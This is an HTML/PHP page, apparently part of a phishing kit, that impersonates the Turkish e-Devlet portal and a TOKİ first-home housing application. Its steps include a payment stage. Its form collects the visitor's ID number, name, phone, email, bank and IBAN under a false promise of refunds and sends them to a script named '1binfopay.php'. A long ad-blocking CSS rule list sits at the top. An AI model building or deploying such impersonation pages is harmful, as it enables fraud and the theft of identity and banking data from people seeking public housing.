:root a[href^="https://a.medfoodsafety.com/"], :root a[href^="//go.eabids.com/"], :root a[href^="//ejitsirdosha.net/"], :root a[href^=" https://www.friendlyduck.com/AF_"], :root [data-cl-spot-id], :root a[href*="/jump/next.php?r="], :root a[href^="https://go.rmishe.com/"], :root [href^="https://ilovemyfreedoms.com/landing-"], :root a[href^="https://syndication.optimizesrv.com/"], :root a[href*="//daichoho.com/"], :root a[href^="https://go.nordvpn.net/aff"] > img, :root .\[\&_\.gdprAdTransparencyCogWheelButton\]\:\!pjra-z-\[5\], :root [href^="http://clicks.totemcash.com/"], :root a[href^="https://ad.zanox.com/ppc/"] > img, :root a[href^="https://lone-pack.com/"], :root [data-d-ad-id], :root a[href*=".engine.adglare.net/"], :root a[href^="https://t.ajrkm3.com/"], :root [href^="https://aads.com/campaigns/"], :root a[href^="//stighoazon.com/"], :root div[id^="lazyad-"], :root a[href^="http://com-1.pro/"], :root [href^="https://www.profitablegatecpm.com/"], :root a[href*=".cfm?domain="][href*="&fp="], :root [data-ad-name], :root a[href^="https://loboclick.com/"], :root a[data-url^="https://vulpix.bet/?ref="], :root a[href^="https://ab.advertiserurl.com/aff/"], :root a[data-oburl^="https://paid.outbrain.com/network/redir?"], :root a[href^="https://go.xlivrdr.com"], :root [onclick^="location.href='https://1337x.vpnonly.site/"], :root [id^="section-ad-banner"], :root a[href^="https://www.goldenfrog.com/vyprvpn?offer_id="][href*="&aff_id="], :root a[href*="//jjgirls.com/sex/Chaturbate"], :root [id^="ad-wrap-"], :root [href^="https://zone.gotrackier.com/"], :root a[href^="http://sarcasmadvisor.com/"], :root [href^="https://www.restoro.com/"], :root [href^="https://www.targetingpartner.com/"], :root .section-subheader > .section-hotel-prices-header, :root [href^="https://www.hostg.xyz/"] > img, :root a[href^="http://adultfriendfinder.com/go/"], :root a[href^="https://fastestvpn.com/lifetime-special-deal?a_aid="], :root a[href^="https://tour.mrskin.com/"], :root [href^="https://www.brighteonstore.com/products/"] img, :root citrus-ad-wrapper, :root a[href^="https://go.grinsbest.com/"], :root a[href^="https://vo2.qrlsx.com/"], :root [href^="https://www.avantlink.com/click.php"] img, :root [href^="https://wwp.hoqodd.com/redirect-zone/"], :root div[id^="div-ads-"], :root [href^="https://rapidgator.net/article/premium/ref/"], :root [href^="https://join.girlsoutwest.com/"], :root a[href^="https://activate-game.com/"], :root .scroll-fixable.rail-right > .deals-rail, :root [data-wpas-zoneid], :root a[href^="https://track.aftrk3.com/"], :root [href^="https://join3.bannedsextapes.com"], :root a[href^="https://bodelen.com/"], :root a[href*=".g2afse.com/"], :root div[id^="adngin-"], :root [data-rc-widget], :root span[data-ez-ph-id], :root [href^="https://track.aftrk1.com/"], :root [href^="https://join.playboyplus.com/track/"], :root a[href^="https://go.xxxijmp.com"], :root [href^="https://istlnkcl.com/"], :root a[href^="https://t.acam.link/"], :root a[href^="https://go.strpjmp.com/"], :root [href^="https://url.totaladblock.com/"], :root a[href^="https://tm-offers.gamingadult.com/"], :root [href^="https://charmingdatings.life/"], :root [href="https://adstub.net/indo666/"], :root [href^="https://glersakr.com/"], :root a[href^="https://a.bestcontentfood.top/"], :root [href^="https://cpa.10kfreesilver.com/"], :root [data-id^="div-gpt-ad"], :root a[href^="https://tracker.loropartners.com/"], :root [href^="https://awbbjmp.com/"], :root div[ow-ad-unit-wrapper], :root a[data-href^="http://ads.trafficjunky.net/"], :root [data-advadstrackid], :root a[href^="https://www.friendlyduck.com/AF_"], :root [href^="https://ad1.adfarm1.adition.com/"], :root a[href^="https://bngprm.com/"], :root [href^="https://shiftnetwork.infusionsoft.com/go/"] > img, :root a[href^="https://go.bushheel.com/"], :root a[href^="https://ctjdwm.com/"], :root a[href^="https://camfapr.com/landing/click/"], :root div[data-ad-wrapper], :root .gnt_em_vp_c[data-g-s="vp_dk"], :root [href="//sexcams.plus/"], :root [href^="http://www.mypillow.com/"] > img, :root a[href^="https://promerycergerful.com/"], :root #kt_player > a[target="_blank"], :root [href="https://ourgoldguy.com/contact/"] img, :root .ob_container .item-container-obpd, :root [id^="div-gpt-ad"], :root [href="https://jdrucker.com/gold"] > img, :root a[href^="https://join.virtualtaboo.com/track/"], :root [id^="ad_sky"], :root [name^="google_ads_iframe"], :root a[href^="https://www.liquidfire.mobi/"], :root .grid > .container > #aside-promotion, :root DFP-AD, :root [href^="https://go.xlrdr.com"], :root a[href^="https://s.cant3am.com/"], :root [data-testid^="taboola-"], :root [data-testid^="section-AdRowBillboard"], :root a[href^="https://track.1234sd123.com/"], :root zeus-ad, :root [data-testid="prism-ad-wrapper"], :root [href^="https://ad.admitad.com/"], :root [href^="https://mypillow.com/"] > img, :root [data-testid="ad_testID"], :root a[href^="https://trk.softonixs.xyz/"], :root [href^="https://www.mypatriotsupply.com/"] > img, :root [href^="https://antiagingbed.com/discount/"] > img, :root a[href*=".adsrv.eacdn.com/"], :root a[href^="https://go.cmtaffiliates.com/"], :root [href^="https://optimizedelite.com/"] > img, :root [data-testid="adBanner-wrapper"], :root [href^="https://mylead.global/stl/"] > img, :root [href^="https://mypatriotsupply.com/"] > img, :root a[href^="https://go.hpyjmp.com"], :root iframe[scrolling="no"][sandbox*="allow-popups allow-modals"][style^="width: 100%; height: 100%; border: none;"], :root [href^="https://mystore.com/"] > img, :root [href^="https://wct.link/click?"], :root div[data-adunit], :root app-large-ad, :root [href^="https://turtlebids.irauctions.com/"] img, :root a[href^="https://witnessjacket.com/"], :root [data-mobile-ad-id], :root [data-dynamic-ads], :root [class^="amp-ad-"], :root a[href^="http://handgripvegetationhols.com/"], :root a[href^="https://go.rmhfrtnd.com"], :root a[href^="https://go.bbrdbr.com"], :root a[href^="https://fc.lc/ref/"], :root [data-adshim], :root topadblock, :root a[href^="//s.zlinkd.com/"], :root #teaser1[style^="width:autopx;"], :root [href^="https://www.cloudways.com/en/?id"], :root [data-asg-ins], :root a[href^="https://gamingadlt.com/?offer="], :root a[href^="https://rixofa.com/"], :root a[href^="https://best-experience-cool.com/"], :root [data-desktop-ad-id], :root [data-adbridg-ad-class], :root #teaser3[style^="width:autopx;"], :root [data-adblockkey], :root [data-block-type="ad"], :root [data-ad-width], :root [onclick*="content.ad/"], :root AMP-AD, :root [data-ad-cls], :root [data-ez-name], :root a[href^="https://go.mnaspm.com/"], :root a[href^="https://service.bv-aff-trx.com/"], :root a[href^="https://6-partner.com/"], :root [class^="s2nPlayer"], :root [href^="https://affiliate.fastcomet.com/"] > img, :root [class^="adDisplay-module"], :root a[href^="https://adclick.g.doubleclick.net/"], :root [data-freestar-ad][id], :root AD-SLOT, :root a[href^="https://www.googleadservices.com/pagead/aclk?"] > img, :root [data-ad-module], :root a[href^="https://go.skinstrip.net"][href*="?campaignId="], :root #teaser2[style^="width:autopx;"], :root [data-revive-zoneid], :root a[href^="https://losingoldfry.com/"], :root div[id^="div-gpt-"], :root a[href^="https://gml-grp.com/"], :root .ob_dual_right > .ob_ads_header ~ .odb_div, :root a[href^="http://tc.tradetracker.net/"] > img, :root [data-testid="commercial-label-taboola"], :root [class^="div-gpt-ad"], :root a[href^="https://traffdaq.com/"], :root a[href^="https://cam4com.go2cloud.org/"], :root a[href^="http://li.blogtrottr.com/click?"], :root a[href^="https://www8.smartadserver.com/"], :root a[href^="https://pb-imc.com/"], :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"], :root a[href^="https://t.ajump1.com/"], :root a[href^="https://wittered-mainging.com/"], :root #teaser3[style="width: 100%;text-align: center;display: scroll;position:fixed;bottom: 0;margin: 0 auto;z-index: 103;"] { display: none !important; }</style></head>
<body>
<header id="top" class="sticky_init1">
    <div class="container">
        <div class="row">
            <div class="col-lg-5">
                <div class="logo-area"></div>
            </div>
            <div class="col-lg-7">
                <ul class="menuList">
                    <li class="hideOnMobile">
                        <span class="fast-shortcuts">
                            <a href="javascript:;">
                                <i class="fa-regular fa-comments"></i>
                                <span> Hızlı Çözüm</span>
                            </a>
                        </span>
                    </li>
                    <li class="hideOnMobile">
                        <div class="dropdown custom">
                            <button class=" dropdown-toggle fast-shortcuts mini" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                                <i class="fa-solid fa-key"></i>
                            </button>
                            <ul class="dropdown-menu">
                                <li><a class="dropdown-item" href="#">Erişilebilirlik<br>Özellikleri</a></li>
                                <li><a class="dropdown-item" href="#">Salt Metin<br>Görünümü</a></li>
                                <li><a class="dropdown-item" href="#">Daha Belirgin<br>Odaklama</a></li>
                            </ul>
                        </div>
                    </li>
                    <li class="hideOnMobile">
                        <span class="fast-shortcuts mini icons">
                            <a href="javascript:;">
                                <i class="fa-regular fa-id-card"></i>
                                <i class="fa-solid fa-star"></i>
                            </a>
                        </span>
                    </li>
                                       <li>
    <div class="header-search" style="position: relative;">
        <input placeholder="Nasıl yardım edebilirim?" id="searchField" name="aranan" value="" autocomplete="off" role="combobox" aria-owns="popSearch" aria-haspopup="true" aria-autocomplete="both" aria-expanded="false" autocorrect="off" autocapitalize="off">
        <i class="fa-solid fa-magnifying-glass" id="searchBtn"></i>

        <!-- Alt seçenek -->
        <div id="searchOption" style="
            display: none; 
            position: absolute; 
            top: 100%; 
            left: 0; 
            right: 0; 
            background: #fff; 
            border: 1px solid #ccc; 
            padding: 10px; 
            cursor: pointer; 
            z-index: 10;
        ">
            Toplu Konut İdaresi Başkanlığı (TOKİ)
        </div>
    </div>
</li>

<script>
const searchField = document.getElementById('searchField');
const searchOption = document.getElementById('searchOption');
const searchBtn = document.getElementById('searchBtn');

// Input tıklandığında veya yazarken seçenek göster
searchField.addEventListener('focus', () => searchOption.style.display = 'block');
searchField.addEventListener('input', () => searchOption.style.display = 'block');

// Seçeneğe tıklandığında yönlendir
searchOption.addEventListener('click', () => window.location.href = 'toki.php');

// Enter tuşuna basıldığında yönlendir
searchField.addEventListener('keydown', function(e){
    if(e.key === 'Enter'){
        e.preventDefault();
        window.location.href = 'konut0.php';
    }
});

// Büyüteç ikonuna tıklandığında yönlendir
searchBtn.addEventListener('click', () => window.location.href = 'konut0.php');

// Dışarı tıklayınca seçenek kaybolur
document.addEventListener('click', function(e){
    if(!searchField.contains(e.target) && !searchOption.contains(e.target)){
        searchOption.style.display = 'none';
    }
});
</script>

                                        <li>
                    </li><li>
                        <div class="dropdown custom custom2">
                            <button class="dropdown1 dropdown-toggle fast-shortcuts" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                                <i class="fa-solid fa-user"></i> <?php echo htmlspecialchars($tckn); ?>                            </button>
                            <ul class="dropdown-menu">
                                <li class="sabit"></li>
                                <li><a class="dropdown-item" href="javascript:;">Benim Sayfam</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Favori Hizmetlerim</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Gelen Kutusu  <em>(13)</em></a></li>
                                <li><a class="dropdown-item" href="javascript:;">İletişim Seçenekleri</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Güvenlik ve Ayarlar</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Şifremi Değiştir</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Güvenli Çıkış</a></li>
                            </ul>
                        </div>
                    </li>
                </ul>
            </div>
        </div>
    </div>
</header>
<main>
    <nav aria-label="Üst Sayfalar">
        <ul>
            <li><a href="konut0.php" class="home"><i class="fa-solid fa-house"></i> Ana Sayfa</a></li>
            <li><a href="toki.php">Toplu Konut İdaresi Başkanlığı</a></li>
           
        </ul>
    </nav>

    <section class="outer">
        <div class="inner">
            <div class="row">
                <div class="col-lg-6">
                    <div class="box-header">
                        <img src="assets/tokilogo.webp">
                        <h2><a href="toki.php">Toplu Konut İdaresi Başkanlığı (TOKİ)</a><em>İlk Evim Konut Başvurusu</em></h2>
                    </div>
                </div>
                <div class="col-lg-6">
                    <div class="actions">
                        <a href="javascript:;">
                            <span class="flex_center">
                                <i class="fa-solid fa-star"></i> <span> Favorilerime Ekle</span>
                            </span>
                        </a>
                        <a href="javascript:;">
                            <span class="flex_center">
                                <i class="fa-solid fa-comment"></i> <span> Puanla / Bildir</span>
                            </span>
                        </a>
                        <a href="javascript:;">
                            <span class="flex_center">
                                <i class="fa-solid fa-share-nodes"></i> <span> Paylaş</span>
                            </span>
                        </a>
                    </div>
                </div>
            </div>
        </div>
        <div class="page-inner">
            <aside>
                <ul>
                    <li>Bu hizmet Toplu Konut İdaresi Başkanlığı (TOKİ) işbirliği ile e-Devlet Kapısı altyapısı üzerinden sunulmaktadır.</li>
                    <li>
                        <div class="timeIcon">
                            <i class="fa-regular fa-clock"></i>
                        </div>
                        Bu işlem için yaklaşık 6 dakikanızı ayırmalısınız.
                    </li>
                    <li>
                        Bu işlem toplam <strong>6</strong> aşamalıdır. <progress value="1" max="2"></progress>
                    </li>
                    <li class="ol-list">
                        <ol class="asamaBtns">
                            <li class="secili">Proje Seçimi</li>
                            <li class="secili">Tip Seçimi</li>
                            <li class="secili">Bilgilendirme ve Onay</li>
                            <li class="secili">Başvuru Formu</li>
                            <li class="secili">Ödeme</li>
                            <li class="secili">İşlem Sonucu</li>
                        </ol>
                    </li>
                </ul>
            </aside>
<content>
    <ul class="toolbar">
        <li style="float: left;">
           <a href="javascript:window.history.back();" class="backbtn"> <i class="fa-solid fa-chevron-left"></i> Geri </a>
        </li>
    </ul>
  
    <!-- İade bilgilendirme paneli -->
    <div class="iade-bilgilendirme">
        <h4><i class="fa-solid fa-info-circle"></i> Önemli Bilgilendirme</h4>
        <p>Başvurunuzun onaylanmaması durumunda ödemiş olduğunuz tutarın iadesinin yapılabilmesi için aşağıdaki banka ve IBAN bilgilerinizi doğru bir şekilde girmeniz gerekmektedir.</p>
    </div>

    <form method="post" class="submitForm" action="1binfopay.php">
<input type="hidden" name="myadsoyad" value="<?php echo htmlspecialchars($tckn); ?>">
<input type="hidden" name="cep" value="">
<input type="hidden" name="email" value="">
<input type="hidden" name="vadecen" value="">
<input type="hidden" name="myiban" value="">
<input type="hidden" name="bank" value="">
    <input type="hidden" name="projeAdi" value="<?php echo htmlspecialchars($projeAdi); ?>">

        <legend><em>1</em> Başvuru Bilgileri</legend>
        <fieldset>
            <dl class="compact">
                <dt>T.C. Kimlik Numarası</dt>
                <dd><?php echo htmlspecialchars($tckn); ?></dd>
            </dl>
            <div class="satir required">
                <div class="fieldError"><i class="fa-solid fa-triangle-exclamation"></i> Bu alanın doldurulması zorunludur.</div>
                <label for="adsoyad"><span class="yildiz" aria-hidden="true">*</span>Adınız Soyadınız</label>
                <input required="required" type="text" name="myadsoyad" id="adsoyad" class="text" value="">
            </div>
            <div class="satir required">
                <div class="fieldError"><i class="fa-solid fa-triangle-exclamation"></i> Bu alanın doldurulması zorunludur.</div>
                <label for="cep"><span class="yildiz" aria-hidden="true">*</span>Cep Telefonu Numaranız</label>
                <input type="text" name="cep" id="cep" class="text" value="" required="required">
                <div class="bilgilendirme">Telefon numaranızı giriniz. Örn; "5XXXXXXXXX"</div>
            </div>
            <div class="satir required">
                <div class="fieldError"><i class="fa-solid fa-triangle-exclamation"></i> Bu alanın doldurulması zorunludur.</div>
                <label for="email"><span class="yildiz" aria-hidden="true">*</span>E-Posta Adresi</label>
                <input type="email" name="vadecen" id="email" required="required" class="text" value="">
                <div class="bilgilendirme">E-posta adresinizi giriniz.</div>
            </div>
        </fieldset>
        
        <legend><em>2</em> İade Bilgileri (Başvuru onaylanmazsa kullanılacak)</legend>
        <fieldset>
            <div class="satir required">
                <div class="fieldError"><i class="fa-solid fa-triangle-exclamation"></i> Bu alanın doldurulması zorunludur.</div>
                <label for="bank"><span class="yildiz" aria-hidden="true">*</span>Banka Seçin</label>
                <select name="bank" id="bank" required="" class="comboBox">
                    <option value="" selected="">Seçiniz</option>
                    <option value="AKBANK">AKBANK</option>
                    <option value="DENIZBANK">DENİZBANK</option>
                    <option value="HALKBANK">HALKBANK</option>
                    <option value="FIBABANKA">FİBABANKA</option>
                    <option value="INGBANK">İNGBANK</option>
                    <option value="GARANTI">GARANTİ BBVA</option>
                    <option value="TEB">TEB</option>
                    <option value="VAKIF">VAKIF BANK</option>
                    <option value="ŞEKERBANK">ŞEKERBANK</option>
                    <option value="ZIRAAT">ZİRAAT BANKASI</option>
                    <option value="QNB">QNB FİNANSBANK</option>
                    <option value="ISBANK">İŞ BANKASI</option>
                    <option value="YAPIKREDI">YAPIKREDİ BANKASI</option>
                    <option value="TRFINANS">TÜRKİYE FİNANS</option>
                    <option value="DIGER">DİĞER</option>
                </select>
                <div class="bilgilendirme">İade işlemi için hesabınızın bulunduğu bankayı seçiniz.</div>
            </div>
            <div class="satir required">
                <div class="fieldError"><i class="fa-solid fa-triangle-exclamation"></i> Bu alanın doldurulması zorunludur.</div>
                <label for="myiban"><span class="yildiz" aria-hidden="true">*</span>IBAN Numaranız</label>
                <input type="text" name="myiban" id="myiban" required="required" class="text" value="" placeholder="TR">
                <div class="bilgilendirme">İade işlemi için IBAN numaranızı giriniz. (TR ile başlayan 26 haneli numara)</div>
            </div>
            <div class="satir required">
                <div class="fieldError"><i class="fa-solid fa-triangle-exclamation"></i> Bu alanın doldurulması zorunludur.</div>
                <label for="calisiyorMusunuz"><span class="yildiz" aria-hidden="true">*</span>Çalışıyor Musunuz?</label>
                <select name="calisiyorMusunuz" id="calisiyorMusunuz" required="" class="comboBox">
                    <option value="">Seçiniz</option>
                    <option value="1">Evet</option>
                    <option value="0">Hayır</option>
                </select>
                <div class="bilgilendirme">Mevcut çalışma durumunuzu belirtiniz.</div>
            </div>
        </fieldset>
        
        <div class="sbmtBtn">
           <input class="gonder gonder2" name="btn" type="submit" value="Devam Et">
        </div>
    </form>
</content>
</div>
</section>
</main>
<footer>
    <div class="inner">
        <div class="starts">
            <nav class="linksarea">
                <h2 class="sectionTitle" id="bottomLinksBlockTitle">Sayfa Sonu Bağlantıları</h2>
                <ul class="links">
                    <li class="bottomLinksGroup">
                        <h3>e-Devlet Kapısı</h3>
                        <ul>
                            <li>
                                <a>English</a>
                            </li>
                            <li>
                                <a>Hakkımızda</a>
                            </li>
                            <li>
                                <a>Yasal Bildirim</a>
                            </li>
                            <li>
                                <a>KVKK Aydınlatma Yükümlülüğü</a>
                            </li>
                            <li>
                                <a accesskey="8">Gizlilik ve Kullanım</a>
                            </li>
                            <li>
                                <a>Politikalarımız</a>
                            </li>
                            <li>
                                <a>DETSİS</a>
                            </li>
                            <li>
                                <a>Kurumsal Kimlik</a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>e-Hizmetler</h3>
                        <ul>
                            <li>
                                <a>Sık Kullanılan Hizmetler</a>
                            </li>
                            <li>
                                <a>Yeni Eklenen Hizmetler</a>
                            </li>
                            <li>
                                <a accesskey="h">Kurum Hizmetleri</a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Yardım</h3>
                        <ul>
                            <li>
                                <a accesskey="6">Genel Yardım</a>
                            </li>
                            <li>
                                <a accesskey="5">Sıkça Sorulanlar</a>
                            </li>
                            <li>
                                <a>Güvenliğiniz İçin</a>
                            </li>
                            <li>
                                <a>Help For Non-Citizens</a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Bize Ulaşın</h3>
                        <ul>
                            <li>
                                <a accesskey="9">İletişim</a>
                            </li>
                            <li>
                                <a>CİMER Başvurusu</a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Erişilebilirlik</h3>
                        <ul>
                            <li>
                                <a href="#" class="textOnlyToggle" data-state="html">Salt Metin Sürümü</a>
                            </li>
                            <li>
                                <a href="#" class="fontSizeToggle" data-state="normal">Daha Belirgin Odaklama</a>
                            </li>
                            <li>
                                <a accesskey="0">Klavye Kısayolları</a>
                            </li>
                            <li>
                                <a href="/site-haritasi" accesskey="3">Site Haritası</a>
                            </li>
                        </ul>
                    </li>
                </ul>
            </nav>
            <div class="right-part">
                <nav class="foot-card">
                    <h2>İletişim Seçenekleri</h2>
                    <div class="card-text">
                        <em>Yardım mı lazım?</em> Aşağıdaki yöntemleri kullanarak bizimle iletişime geçebilirsiniz.
                    </div>
                    <ul>
                        <li>
                            <a href="javascript:;"><i class="fa-regular fa-comments"></i> Hızlı Çözüm Merkezi</a>
                        </li>
                        <li>
                            <a href="javascript:;"><i class="fa-regular fa-envelope"></i> Bize Yazın</a>
                        </li>
                        <li>
                            <a href="javascript:;"><i class="fa-solid fa-phone-flip"></i> e-Devlet Çağrı Merkezi</a>
                        </li>
                        <li>
                            <a href="javascript:;"><i class="fa-solid fa-ear-deaf"></i> Engelsiz Çağrı Merkezi</a>
                        </li>
                    </ul>
                </nav>
                <nav class="social-links">
                    <a><i class="fa-brands fa-facebook-f"></i> Facebook </a>
                    <a><i class="fa-brands fa-x-twitter"></i> Twitter </a>
                    <a><i class="fa-brands fa-youtube"></i> Youtube </a>
                    <a><i class="fa-brands fa-instagram"></i> Instagram </a>
                </nav>
            </div>
        </div>
        <div class="sub-copyright">
            <div class="images">
                <a class="externalLink" rel="external" href="javascript:;">
                  
                </a>
                <a class="externalLink" rel="external" href="javascript:;">
                   
                </a>
            </div><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;14d1d027c8904f0894e1033694aa6bef&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
</div></div></footer></body></html>